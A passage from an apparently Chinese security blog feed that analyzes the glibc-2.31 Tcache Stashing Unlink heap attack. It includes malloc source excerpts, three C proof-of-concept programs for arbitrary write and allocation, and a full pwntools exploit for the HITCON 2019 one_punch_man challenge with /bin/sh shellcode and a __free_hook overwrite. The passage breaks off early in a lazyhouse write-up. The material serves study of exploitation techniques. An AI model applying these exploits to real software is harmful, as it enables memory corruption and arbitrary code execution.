serve</code></pre><p>最后用 git 把代码同步到远程仓库，并在 coding 上进行部署即可：</p><pre><code class="bash">$ git add --all .$ git commit -m &quot;message&quot;$ git push origin master</code></pre><p>jekyll 默认主题比较简洁，我个人比较喜欢。但好像相比 hexo 对文章的管理要麻烦一点。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://jekyllrb.com/docs/installation/" target="_blank" rel="noopener">https://jekyllrb.com/docs/installation/</a><br><a href="https://www.jianshu.com/p/9f198d5779e6" target="_blank" rel="noopener">https://www.jianshu.com/p/9f198d5779e6</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>macos</tag>
      
      <tag>jekyll</tag>
      
      <tag>coding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tcache Stashing Unlink Attack</title>
    <link href="/2020/05/05/Tcache-Stashing-Unlink-Attack/"/>
    <url>/2020/05/05/Tcache-Stashing-Unlink-Attack/</url>
    
    <content type="html"><![CDATA[<p>自 glibc-2.29 后 Unsortedbin Attack 已经不再适用，在 Tcache 机制上又出现了一种新的技术。</p><a id="more"></a><blockquote><p>本文基于 glibc-2.31（Ubuntu 20.04）。</p></blockquote><h1 id="Structure-amp-Functions"><a href="#Structure-amp-Functions" class="headerlink" title="Structure &amp; Functions"></a>Structure &amp; Functions</h1><p>主要根据源码来分析一下。首先，相比之前 2.27 的 tcache，现在的 tcache_entry 结构体新增了一个 key 字段；且 tcache_perthread_struct 中的 counts 字段从 uint8_t 变成了 uint16_t：</p><pre><code class="cpp">/* We overlay this structure on the user-data portion of a chunk when   the chunk is stored in the per-thread cache.  */typedef struct tcache_entry{  struct tcache_entry *next;  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;} tcache_entry;/* There is one of these for each thread, which contains the   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping   overall size low is mildly important.  Note that COUNTS and ENTRIES   are redundant (we could have just counted the linked list each   time), this is for performance reasons.  */typedef struct tcache_perthread_struct{  uint16_t counts[TCACHE_MAX_BINS];  tcache_entry *entries[TCACHE_MAX_BINS];} tcache_perthread_struct;</code></pre><p>然后在 free 的时候新增了一段对 tcache 的 Double Free 的检测代码，先是检测 key 值是否等于 tcache，然后会遍历 tcache 来判断有没有重复 free：</p><pre><code class="cpp">    /* This test succeeds on double free.  However, we don&#39;t 100%       trust it (it also matches random payload data at a 1 in       2^&lt;size_t&gt; chance), so verify it&#39;s not an unlikely       coincidence before aborting.  */    if (__glibc_unlikely (e-&gt;key == tcache))      {        tcache_entry *tmp;        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx];         tmp;         tmp = tmp-&gt;next)          if (tmp == e)        malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);        /* If we get here, it was a coincidence.  We&#39;ve wasted a           few cycles, but don&#39;t abort.  */      }</code></pre><p>在 tcache_put 中也新增了对 key 字段的存储，用于后面对 Double Free 的检查：</p><pre><code class="cpp">/* Caller must ensure that we know tc_idx is valid and there&#39;s room   for more chunks.  */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}</code></pre><p>在 Fastbins 处理过程中新增了一个 Stash 机制，每次从 Fastbins 取 Chunk 的时候会把剩下的 Chunk 全部依次放进对应的 tcache，直到 Fastbins 空或是 tcache 满：</p><pre><code class="cpp">#if USE_TCACHE          /* While we&#39;re here, if we see other chunks of the same size,         stash them in the tcache.  */          size_t tc_idx = csize2tidx (nb);          if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        {          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = *fb) != NULL)            {              if (SINGLE_THREAD_P)            *fb = tc_victim-&gt;fd;              else            {              REMOVE_FB (fb, pp, tc_victim);              if (__glibc_unlikely (tc_victim == NULL))                break;            }              tcache_put (tc_victim, tc_idx);            }        }#endif</code></pre><p>然后是 Smallbins 解链的部分这里，根据大小确定 idx 并找到 Smallbins 对应的地址 bin。然后将 victim 设置为 bin 的 bk 所指向的 Chunk（根据 FIFO，即为最先放入的 Chunk），并判断 victim 的 bk 的 fd（bck 的 fd）是否指回 victim，即是否构成双向链表。接下来设置 victim 的 prev_inuse 位，并将 bin 的 bk 指向 victim 的后一个 Chunk，将 victim 后一个 Chunk 的 fd 指向 bin，即将 victim 取出：</p><pre><code class="cpp">   /*     If a small request, check regular bin.  Since these &quot;smallbins&quot;     hold one size each, no searching within bins is necessary.     (For a large request, we need to wait until unsorted chunks are     processed to find best fit. But for small ones, fits are exact     anyway, so we can check now, which is faster.)   */  if (in_smallbin_range (nb))    {      idx = smallbin_index (nb);      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin)        {          bck = victim-&gt;bk;      if (__glibc_unlikely (bck-&gt;fd != victim))        malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);          set_inuse_bit_at_offset (victim, nb);          bin-&gt;bk = bck;          bck-&gt;fd = bin;</code></pre><p>接下来是 Smallbins 后面对 tcache 的使用。和前面一样先是定位到对应 tcache 的 idx，然后判断 tcache 中的 Chunk 数量以及第一个 tc_victim 是否和 bin 构成双向链表。并且和 Fastbins 一样，把 Smallbins 中剩下的 Chunk 放进对应的 tcache 中：</p><pre><code class="cpp">#if USE_TCACHE      /* While we&#39;re here, if we see other chunks of the same size,         stash them in the tcache.  */      size_t tc_idx = csize2tidx (nb);      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        {          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks over.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = last (bin)) != bin)        {          if (tc_victim != 0)            {              bck = tc_victim-&gt;bk;              set_inuse_bit_at_offset (tc_victim, nb);              if (av != &amp;main_arena)            set_non_main_arena (tc_victim);              bin-&gt;bk = bck;              bck-&gt;fd = bin;              tcache_put (tc_victim, tc_idx);                }        }</code></pre><h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><h2 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h2><p>根据前面分析的部分，<code>bck-&gt;fd = bin;</code> 这句代码可以达到和 Unsortedbin Attack 类似的效果，可以将一个 main_arena 中的地址（bin）写入指定位置（bck-&gt;fd）。这种 Smallbins 解链方式类似于远古版本的无检测 unlink ，就此也产生了新的利用方式，目前适用于所有带 tcache 的 glibc 版本。操作大概如下：</p><ol><li>先放入 2 个 Chunk 到 Smallbins，6 个 Chunk 到对应的 tcache；</li><li>然后在不破坏 fd 的情况下将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10。这样当再向 Smallbins 申请对应大小的 Chunk 时（使用 calloc 就不会请求 tcache），先放入 Smallbins 的 Chunk 被分配给用户，然后触发 stash 机制。<code>bck = tc_victim-&gt;bk;</code> 此时的 bck 就是目标地址减 0x10，之后 <code>bck-&gt;fd = bin;</code> 也就是将目标地址上的值赋为 bin，这样就实现了等价于 Unsortedbin Attack 的操作；</li><li>之后调用 tcache_put 把后放入 Smallbins 的 Chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 Chunk，在这次之后达到了阈值，所以也就退出了 stash 循环，整个流程就会正常结束。</li></ol><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;uint64_t victim = 0;int main() {    int i;    void *p, *q, *padding;    fprintf(stderr, &quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n&quot;);    fprintf(stderr, &quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;);    p = malloc(0x18);    fprintf(stderr, &quot;[+] victim&#39;s address =&gt; %p, victim&#39;s vaule =&gt; 0x%lx\n&quot;, &amp;victim, victim);    fprintf(stderr, &quot;[+] heap address =&gt; %p\n&quot;, (uint64_t)p - 0x260);    fprintf(stderr, &quot;\n2. choose a stable size and free six identical size chunks to tcache_entry list\n&quot;);       fprintf(stderr, &quot;Here, I choose 0x60\n&quot;);    for (i = 0; i &lt; 6; i++) {        p = calloc(1, 0x58);        free(p);    }    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        p, (uint64_t)p - 0x60, (uint64_t)p - 0x60 * 2, (uint64_t)p - 0x60 * 3, (uint64_t)p - 0x60 * 4, (uint64_t)p - 0x60 * 5);    fprintf(stderr, &quot;\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;);    p = malloc(0x428);    fprintf(stderr, &quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;, p);    padding = malloc(0x28);    fprintf(stderr, &quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;, p);    free(p);    fprintf(stderr, &quot;Free chunk %p to unsortedbin\n&quot;, p);    malloc(0x428 - 0x60);    fprintf(stderr, &quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;);    malloc(0x108);    fprintf(stderr, &quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;);    fprintf(stderr, &quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;);    q = malloc(0x428);    padding = malloc(0x88);    free(q);    malloc(0x3c8);    malloc(0x108);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)q + 0x3c0);    fprintf(stderr, &quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;, (uint64_t)p + 0x3c0, (uint64_t)q + 0x3c0);    fprintf(stderr, &quot;\n4. overwrite the first chunk in smallbin[4]&#39;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;);    fprintf(stderr, &quot;Change %p&#39;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)(&amp;victim) - 0x10);    *(uint64_t *)((uint64_t)q + 0x3c0 + 0x18) = (uint64_t)(&amp;victim) - 0x10;    printf(&quot;\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;);    calloc(1, 0x58);    printf(&quot;Finally, the victim&#39;s value is changed to a big number\n&quot;);    printf(&quot;Now, victim&#39;s value =&gt; 0x%lx\n&quot;, victim);    return 0;}</code></pre><h2 id="Tcache-Stashing-Unlink-Attack-Plus"><a href="#Tcache-Stashing-Unlink-Attack-Plus" class="headerlink" title="Tcache Stashing Unlink Attack Plus"></a>Tcache Stashing Unlink Attack Plus</h2><p>可以实现任意地址的分配，和上述布局大致相同，不过有细微差异。操作大概如下：</p><ol><li>放入 2 个 Chunk 到 Smallbins，5 个 Chunk 到对应的 tcache，后在不破坏 fd 的情况下将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10，同时要将目标地址加 0x8 处的值设置为一个指向一处可写内存的指针；</li><li>在 stash 机制时，会将后放入 Smallbins 的 Chunk 被放入 tcache，此时的 bin-&gt;bk 就是目标地址减 0x10，相当于把目标地址减 0x10 的指针链接进了 Smallbins 中。之后不满足终止条件，会进行下一次的 stash，这时的 tc_victim 就是目标地址；</li><li>接下来执行 <code>bck = tc_victim-&gt;bk; bck-&gt;fd = bin;</code>，将目标地址加 0x8 处的指针。最后目标地址就会被放入 tcache_entry 的头部，stash 满足终止条件而终止。</li></ol><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;static uint64_t victim[4] = {0, 0, 0, 0};int main() {    int i;    void *p, *q, *r, *padding;    fprintf(stderr, &quot;You can use this technique to get a tcache chunk to arbitrary address\n&quot;);    fprintf(stderr, &quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;);    p = malloc(0x18);    fprintf(stderr, &quot;[+] victim&#39;s address =&gt; %p, victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        &amp;victim, victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;[+] heap address =&gt; %p\n&quot;, (uint64_t)p - 0x260);    fprintf(stderr, &quot;\n2. change victim&#39;s data, make victim[1] = &amp;victim, or other address to writable address\n&quot;);    victim[1] = (uint64_t)(&amp;victim);    fprintf(stderr, &quot;victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;);    fprintf(stderr, &quot;Here, I choose the size 0x60\n&quot;);    for (i = 0; i &lt; 5; i++){        r = calloc(1, 0x58);        free(r);    }    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);    fprintf(stderr, &quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;);    p = malloc(0x428);    fprintf(stderr, &quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;, p);    padding = malloc(0x28);    fprintf(stderr, &quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;, p);    free(p);    fprintf(stderr, &quot;Free chunk %p to unsortedbin\n&quot;, p);    malloc(0x3c8);    fprintf(stderr, &quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;);    malloc(0x108);    fprintf(stderr, &quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;);    fprintf(stderr, &quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;);    q = malloc(0x428);    padding = malloc(0x88);    free(q);    malloc(0x3c8);    malloc(0x108);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)q + 0x3c0);    fprintf(stderr, &quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;\n5. overwrite the first chunk in smallbin[4]&#39;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;);    fprintf(stderr, &quot;Change %p&#39;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)(&amp;victim) - 0x10);    *(uint64_t *)(q + 0x3c0 + 0x18) = (uint64_t)(&amp;victim) - 0x10;    fprintf(stderr, &quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;);    calloc(1, 0x58);    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        &amp;victim, (uint64_t)q + 0x3d0, r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);    printf(&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;);    p = malloc(0x58);    *(uint64_t *)((uint64_t)p) = 0xaa;    *(uint64_t *)((uint64_t)p + 0x8) = 0xbb;    *(uint64_t *)((uint64_t)p + 0x10) = 0xcc;    *(uint64_t *)((uint64_t)p + 0x18) = 0xdd;    printf(&quot;victim&#39;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        victim[0], victim[1], victim[2], victim[3]);    return 0;}</code></pre><h2 id="Tcache-Stashing-Unlink-Attack-Plus-Plus"><a href="#Tcache-Stashing-Unlink-Attack-Plus-Plus" class="headerlink" title="Tcache Stashing Unlink Attack Plus Plus"></a>Tcache Stashing Unlink Attack Plus Plus</h2><p>同时实现上面的两种功能。操作大概如下：</p><ol><li>将 Smallbins 里的 bk 设置为目标地址 1 减 0x10，将目标地址 1 加 0x8 的位置设置为目标地址 2 减 0x10。这样就可以将 tcache 分配到目标地址 1，同时向目标地址 2 写入一个大数字。</li></ol><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;uint64_t victim[4] = {0, 0, 0, 0};uint64_t target = 0;int main() {    int i;    void *p, *q, *r, *padding;    fprintf(stderr, &quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n&quot;);    fprintf(stderr, &quot;\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n&quot;);    p = malloc(0x18);    fprintf(stderr, &quot;[+] victim&#39;s address =&gt; %p, victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        &amp;victim, victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;[+] target&#39;s address =&gt; %p, target&#39;s value =&gt; 0x%lx\n&quot;,        &amp;target, target);    fprintf(stderr, &quot;[+] heap address =&gt; %p\n&quot;, (uint64_t)p - 0x260);    fprintf(stderr, &quot;\n2. change victim&#39;s data, make victim[1] = &amp;target-0x10\n&quot;);    victim[1] = (uint64_t)(&amp;target) - 0x10;    fprintf(stderr, &quot;victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;);    fprintf(stderr, &quot;Here, I choose 0x60\n&quot;);    for (i = 0; i &lt; 5; i++) {        r = calloc(1, 0x58);        free(r);    }    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);    fprintf(stderr, &quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;);    p = malloc(0x428);    fprintf(stderr, &quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;, p);    padding = malloc(0x28);    fprintf(stderr, &quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;, p);    free(p);    fprintf(stderr, &quot;Free chunk %p to unsortedbin\n&quot;, p);    malloc(0x3c8);    fprintf(stderr, &quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;);    malloc(0x108);    fprintf(stderr, &quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;);    fprintf(stderr, &quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;);    q = malloc(0x428);    padding = malloc(0x88);    free(q);    malloc(0x3c8);    malloc(0x108);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)q + 0x3c0);    fprintf(stderr, &quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;\n5. overwrite the first chunk in smallbin[4]&#39;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;);    fprintf(stderr, &quot;Change %p&#39;s bk pointer to &amp;victim-0x10 address =&gt; 0x%lx\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)(&amp;victim) - 0x10);    *(uint64_t *)((uint64_t)q + 0x3c0 + 0x18) = (uint64_t)(&amp;victim) - 0x10;    fprintf(stderr, &quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;);    calloc(1, 0x58);    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        &amp;victim, (uint64_t)q + 0x3d0, r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);    fprintf(stderr, &quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;);    p = malloc(0x58);    *(uint64_t *)((uint64_t)p) = 0xaa;    *(uint64_t *)((uint64_t)p + 0x8) = 0xbb;    *(uint64_t *)((uint64_t)p + 0x10) = 0xcc;    *(uint64_t *)((uint64_t)p + 0x18) = 0xdd;    fprintf(stderr, &quot;victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;target&#39;s value =&gt; 0x%lx\n&quot;, target);    return 0;}</code></pre><h2 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h2><p>总结一下，可以进行利用的最基本条件如下：</p><ol><li>可以获得堆的地址；</li><li>可以修改 Smallbins 中 Chunk 的 bk 字段。</li></ol><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>记录一些漏洞相关的题目。在参考网站中记录了很多讲得很好的博客，这里对题目等的描述就直接略过了。</p><blockquote><p>在实际做题过程中发现 glibc-2.29 和 glibc-2.31 下的题目 IDA 不能很好地反编译 switch 语句，比较推荐用 Ghidra 或是 Cutter。</p></blockquote><h2 id="2019-HITCON-one-punch-man（tcache-stashing-unlink-attack）"><a href="#2019-HITCON-one-punch-man（tcache-stashing-unlink-attack）" class="headerlink" title="2019-HITCON-one_punch_man（tcache stashing unlink attack）"></a>2019-HITCON-one_punch_man（tcache stashing unlink attack）</h2><blockquote><p>环境：Ubuntu 20.04（VMware Fusion）<br>原本程序加了 seccomp filter，因为主要是复现新技术，就将对应的代码 patch 掉了；同时题目中的隐藏函数只有在 tache 0x220 对应的 count 大于 6 时才能调用，但因为用的是 glibc-2.31 的环境，count 字段从 1 个字节变为了 2 个字节，偏移就对不上了，所以这里也把对应的 if 语句 patch 掉了。</p></blockquote><p>在 debut 时发现不能用 fastbins，而且调用的是 calloc（不从 tcache 拿），然后在隐藏函数中调用 malloc，如果我们在 tcache 中布置好对应的 Chunk，就能用 malloc 取到对应的 Chunk：</p><pre><code class="cpp">unsigned __int64 __fastcall debut(__int64 a1, __int64 a2){  unsigned int idx; // [rsp+8h] [rbp-418h]  signed int len; // [rsp+Ch] [rbp-414h]  char s[1032]; // [rsp+10h] [rbp-410h]  unsigned __int64 v6; // [rsp+418h] [rbp-8h]  v6 = __readfsqword(0x28u);  write_buf(&quot;idx: &quot;);  idx = read_int();  if ( idx &gt; 2 )    error((__int64)&quot;invalid&quot;);  write_buf(&quot;hero name: &quot;);  memset(s, 0, 0x400uLL);  len = read(0, s, 0x400uLL);  if ( len &lt;= 0 )    error((__int64)&quot;io&quot;);  s[len - 1] = 0;  if ( len &lt;= 0x7F || len &gt; 0x400 )    error((__int64)&quot;poor hero name&quot;);  *((_QWORD *)&amp;unk_4040 + 2 * idx) = calloc(1uLL, len);  qword_4048[2 * idx] = len;  strncpy(*((char **)&amp;unk_4040 + 2 * idx), s, len);  memset(s, 0, 0x400uLL);  return __readfsqword(0x28u) ^ v6;}__int64 __fastcall punch(__int64 a1, __int64 a2){  __int64 v2; // rax  void *buf; // [rsp+8h] [rbp-8h]  v2 = *(unsigned __int8 *)(qword_4030 + 0x20);  buf = malloc(0x217uLL);  if ( !buf )    error((__int64)&quot;err&quot;);  if ( read(0, buf, 0x217uLL) &lt;= 0 )    error((__int64)&quot;io&quot;);  puts(&quot;Serious Punch!!!&quot;);  puts(&amp;unk_2128);  return puts(buf);}</code></pre><p>free 的时候存在 Use After Free：</p><pre><code class="cpp">void __fastcall retire(__int64 a1, __int64 a2){  unsigned int v2; // [rsp+Ch] [rbp-4h]  write_buf(&quot;idx: &quot;);  v2 = read_int();  if ( v2 &gt; 2 )    error((__int64)&quot;invalid&quot;);  free(*((void **)&amp;unk_4040 + 2 * v2));}</code></pre><p>依次泄漏 heap 和 libc，然后构造用于 tcache stashing unlink attack 的两个 smallbins，最后就可以直接改 free_hook 为 system（因为我已经把 seccomp filter 给 patch 了）。Exploit：</p><pre><code class="python">#!/usr/bin/env python3from pwn import *context.arch = &#39;amd64&#39;#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./one_punch&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;&gt; &#39;)    p.sendline(str(c))def new(idx, name):    cmd(1)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))    p.recvuntil(&#39;hero name: &#39;)    p.send(name)    sleep(0.1)def edit(idx, name):    cmd(2)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))    p.recvuntil(&#39;hero name: &#39;)    p.send(name)    sleep(0.1)def show(idx):    cmd(3)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))def free(idx):    cmd(4)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))def leave():    cmd(5)def punch(data):    cmd(0xC388)    p.send(data)    sleep(0.1)for i in range(5):    new(0, str(i) * 0xf8)    free(0) # fillup tcache 0x100new(0, &#39;0&#39; * 0x408)new(1, &#39;1&#39; * 0x408)free(0)free(1)show(1) # leak heapp.recvuntil(&#39;hero name: &#39;)heap_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)) - 0x7a0info(&#39;heap_base = &#39; + hex(heap_base))#gdb.attach(p)for i in range(5):    new(0, str(i) * 0x408)    free(0) # fillup tcache 0x410new(0, &#39;0&#39; * 0x408)sh = asm(&#39;&#39;&#39;    xor rax, rax    mov al, 59    xor rsi, rsi    xor rdx, rdx    mov rdi, 0x68732f2f6e69622f    push rdi    mov rdi, rsp    syscall&#39;&#39;&#39;)info(&#39;sh =&gt; &#39; + repr(sh))new(1, sh.ljust(0x408, b&#39;\x90&#39;))shellcode_addr = heap_base + 0x2820info(&#39;shellcode_addr = &#39; + hex(shellcode_addr))free(0)show(0) # leak libcp.recvuntil(&#39;hero name: &#39;)libc_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)) - 0x1ebbe0info(&#39;libc_base = &#39; + hex(libc_base))#gdb.attach(p)for i in range(3):    new(1, &#39;1&#39; * 0x408)    new(2, &#39;2&#39; * 0x408) # prevent from consolidate    free(1) # put into unsorted bin    new(2, &#39;2&#39; * 0x308) # stash remainder(0x100) into small binsnew(0, &#39;0&#39; * 0x217) # set up tcache 0x217 before unlinkfree(0) # put into tcache 0x220payload = b&#39;\x00&#39; * 0x308 + p64(0x101) + p64(heap_base + 0x3340) + p64(heap_base + 0x40)#payload = p64(0xdeadbeef)edit(1, payload) # overwrite smallbins&#39; bknew(1, &#39;1&#39; * 0xf8) # unlink#gdb.attach(p)free_hook_addr = libc_base + libc.symbols[&#39;__free_hook&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]edit(0, p64(free_hook_addr).ljust(0x217, b&#39;\x00&#39;)) # change tcache 0x220&#39;s fd =&gt; __free_hookpunch(&#39;punch&#39;) # get a chunk from tcache 0x220punch(p64(system_addr)) # get __free_hook from tcache 0x220new(2, b&#39;/bin/sh\x00&#39;.ljust(0x408, b&#39;\x00&#39;))free(2)p.interactive()</code></pre><h2 id="2019-HITCON-lazyhouse（tcache-stashing-unlink-attack-plus）"><a href="#2019-HITCON-lazyhouse（tcache-stashing-unlink-attack-plus）" class="headerlink" title="2019-HITCON-lazyhouse（tcache stashing unlink attack plus）"></a>2019-HITCON-lazyhouse（tcache stashing unlink attack plus）</h2><blockquote><p>环境：Ubuntu 19.04（Docker）<br>源程序也有 seccomp filter，这里 patch 了<br>使用 IDA 反编译时不能正常显示 switch 语句，具体修改参考<a href="https://www.bilibili.com/read/cv5150631/" target="_blank" rel="noopener">这篇文章</a>。</p></blockquote><p>这道题目非常精彩，结合了很多技术，<a href="http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse-Part-2/" target="_blank" rel="noopener">keenan 的博客</a>里解释的很详细。因为其中会涉及在 tcache_pthread_struct 上伪造 Chunk，而 glibc-2.31 中的 count 字段从 1 个字节变为了 2 个字节，所以在 20.04 上暂时没想到利用方法，这里就在 19.04 上复现了一遍。buy 的时候可以看到同样不能用 fastbins，而且会比较钱的大小（money 初始化为 0x1c796），这里存在一个乘法溢出。且使用 calloc：</p><pre><code class="cpp">    if ( size &gt; 0x7F )    {      if ( 0xDA * size &lt;= money )      {        memset(&amp;s, 0, 0x100uLL);        snprintf(&amp;s, 0x100uLL, &quot;Price:%lu&quot;, 